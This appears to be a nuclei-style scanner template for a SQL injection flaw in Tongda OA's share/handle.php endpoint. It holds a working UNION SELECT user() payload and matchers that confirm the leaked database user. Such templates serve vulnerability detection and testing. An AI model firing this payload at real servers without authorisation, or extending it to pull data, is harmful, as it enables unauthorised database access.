id: poc-yaml-tongda-oa-handle-php-sqli
info:
  name: "通达OA handle.php 接口 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Tongda OA
http:
  - method: GET
    path:
      - "{{BaseURL}}/share/handle.php?_GET[module]=1%27={`%27`%202}+union%20select%20user()--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"status":"1"'
      - type: word
        part: body
        words:
          - "share_id=root@"
